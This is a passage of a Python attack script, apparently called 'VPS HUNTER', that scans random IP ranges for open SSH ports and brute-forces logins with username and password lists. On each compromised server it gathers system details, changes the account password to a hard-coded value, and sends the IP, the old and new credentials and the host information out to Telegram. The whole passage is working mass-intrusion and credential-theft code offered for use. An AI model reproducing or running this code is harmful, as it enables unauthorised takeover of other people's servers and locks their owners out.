NETWORKS = [ipaddress.ip_network(r, strict=False) for r in WEAK_RANGES]
total_ips = sum(n.num_addresses for n in NETWORKS)

stats = {'scanned': 0, 'open': 0, 'success': 0, 'start': time.time()}
lock = threading.Lock()
stop = threading.Event()

def rand_ip():
    net = random.choice(NETWORKS)
    if net.num_addresses <= 2:
        return str(net.network_address)
    return str(net.network_address + random.randint(1, net.num_addresses-2))

def get_system_info(client):
    info = {'hostname': '?', 'ram': '?', 'os': '?', 'user': '?', 'uptime': '?'}
    try:
        _, stdout, _ = client.exec_command('hostname', timeout=2)
        info['hostname'] = stdout.read().decode().strip()[:50] or '?'
    except: pass
    try:
        _, stdout, _ = client.exec_command('free -m | awk \"/Mem:/ {print \\$2}\"', timeout=2)
        ram_mb = stdout.read().decode().strip()
        if ram_mb and ram_mb.isdigit():
            ram_gb = round(int(ram_mb) / 1024, 1)
            info['ram'] = f'{ram_gb}GB'
    except: pass
    try:
        _, stdout, _ = client.exec_command('cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d \"', timeout=2)
        info['os'] = stdout.read().decode().strip()[:50] or 'Linux'
    except: pass
    try:
        _, stdout, _ = client.exec_command('whoami', timeout=2)
        info['user'] = stdout.read().decode().strip()[:20] or '?'
    except: pass
    try:
        _, stdout, _ = client.exec_command('cat /proc/uptime', timeout=2)
        uptime_seconds = stdout.read().decode().strip().split()[0]
        if uptime_seconds and uptime_seconds.replace('.', '').isdigit():
            days = int(float(uptime_seconds) // 86400)
            info['uptime'] = f'{days} DAYS'
    except: pass
    return info

def try_hack(ip):
    if ip in hacked_ips:
        return
    try:
        sock = socket.socket()
        sock.settimeout(TIMEOUT_PORT)
        sock.connect((ip, 22))
        sock.close()
        with lock:
            stats['open'] += 1
    except:
        return

    import paramiko
    for user in USERS:
        for pwd in PASSWORDS:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=pwd, timeout=TIMEOUT_SSH, allow_agent=False, look_for_keys=False)

                info = get_system_info(client)
                
                ram_gb = 0
                if info.get('ram') and info['ram'].replace('GB', '').replace('.', '').isdigit():
                    ram_gb = float(info['ram'].replace('GB', ''))
                
                if ram_gb < MIN_RAM_GB:
                    client.close()
                    continue

                new_pass = 'Sa9rvps@182@13'
                client.exec_command(f'echo \"{user}:{new_pass}\" | chpasswd', timeout=2)
                client.close()

                hacked_ips.add(ip)
                
                with lock:
                    stats['success'] += 1
                    msg = f'✅ VPS HACKED!\nIP: {ip}\nUser: {user}\nPassword: {pwd}\nNew pass: {new_pass}\nHostname: {info.get('hostname', '?')}\nRAM: {info.get('ram', '?')}\nOS: {info.get('os', 'Linux')}'
                    send_telegram(msg)
                break
            except:
                continue

def worker():
    while not stop.is_set():
        ip = rand_ip()
        with lock:
            stats['scanned'] += 1
            if stats['scanned'] % 1000 == 0:
                elapsed = time.time() - stats['start']
                speed = int(stats['scanned'] / elapsed) if elapsed > 0 else 0
                print(f'\r⚡ HUNTER: {stats['scanned']:,} | SSH: {stats['open']} | صيد: {stats['success']} | {speed:,} IP/s', end='', flush=True)
        time.sleep(random.uniform(0.006, 0.012))
        try_hack(ip)

print(f'[+] VPS HUNTER STARTED!')
print(f'[+] Total IPs: ~{total_ips:,}')

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=worker)
    t.daemon = True
    t.start()
    threads.append(t)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    stop.set()
    print('\n[+] Stopped')
"
